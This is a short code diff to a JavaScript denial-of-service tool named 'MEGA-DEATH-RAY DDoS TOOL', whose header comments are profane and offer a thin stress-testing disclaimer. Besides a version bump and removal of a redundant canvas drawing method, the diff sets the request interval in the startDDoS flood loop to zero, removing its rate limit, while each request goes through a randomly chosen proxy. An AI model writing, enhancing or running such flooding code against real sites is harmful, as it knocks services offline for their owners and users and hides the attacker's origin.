@@ -1,4 +1,4 @@
-// MEGA-DEATH-RAY DDoS TOOL - Noodles Inc. (v7.5)
+// MEGA-DEATH-RAY DDoS TOOL - Noodles Inc. (v7.6)
 // WARNING: This tool is designed for **EXTREME** stress-testing only. Unauthorized use is a felony, you fuckin' degenerate.
 // By using this, you agree to sell your soul and firstborn to Noodles Inc. We ain't responsible for your dumbass choices.
 // ALL activities are logged in high-definition, so don't get cute. We're watching you, bitch.
@@ -67,9 +67,6 @@ class Particle {
         particleCtx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
         particleCtx.closePath();
         particleCtx.fill();
-    }
-    arc(x, y, size, startAngle, endAngle) {
-        particleCtx.arc(x, y, size, startAngle, endAngle);
     }
 }
 
@@ -292,7 +289,7 @@ function startDDoS(targetUrl, hexBytes, requestRate) {
     startTime = new Date();
 
     // Rate-limiting
-    const intervalTime = 1000 / requestRate; // Interval between requests in milliseconds
+    const intervalTime = 0; // No rate limit, you crazy bastard
 
     floodInterval = setInterval(() => {
         const proxy = proxies[Math.floor(Math.random() * proxies.length)];  // Select a random proxy
